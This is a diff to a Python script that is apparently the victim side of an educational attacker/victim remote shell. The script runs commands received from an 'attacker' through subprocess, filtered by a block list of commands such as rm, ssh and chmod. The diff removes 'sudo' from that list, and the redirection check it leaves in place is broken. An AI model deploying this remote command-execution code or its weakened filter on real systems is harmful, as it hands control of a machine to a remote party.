@@ -11,7 +11,7 @@ PORT = 0
 MAX_CONNECTIONS = 10
 BUFFER_SIZE = 1024
 
-UNSUPPORTED_COMMANDS = ["rm", "mv", "mkdir", "touch", "tail", "apt", "sudo", "brew", "nano", "man", "ssh", "chmod", "crontab", "gdb"]
+UNSUPPORTED_COMMANDS = ["rm", "mv", "mkdir", "touch", "tail", "apt", "brew", "nano", "man", "ssh", "chmod", "crontab", "gdb"]
 UNSUPPORTED_REDIRECTIONS = [">", "<", ">>", "|"]
 
 def parse_arguments():
@@ -110,23 +110,20 @@ def handle_command(attacker_data):
     commands = attacker_data.split(" ")
 
     if commands[0] in UNSUPPORTED_COMMANDS or commands in UNSUPPORTED_REDIRECTIONS:
-        print("Victim - Unsupported command: {}".format(commands[0]))
+        print("Victim - Unsupported command found.")
         return "Unsupported command. Try again."
 
     return execute_command(commands)
 
 def execute_command(commands):
+    output = ""
     result = subprocess.run(commands, capture_output=True,
                             text=True)  # capture_output=True captures stdout and stderr, text=True decodes the output.
-    output = ""
 
     if result.returncode == 0:
         print("Command executed successfully!")
         if result.stdout:
             output = result.stdout
-
-        if result.stderr:
-            output = result.stderr
     else:
         print(f"Victim - Command failed with return code {result.returncode}")
         print("Error:", result.stderr)
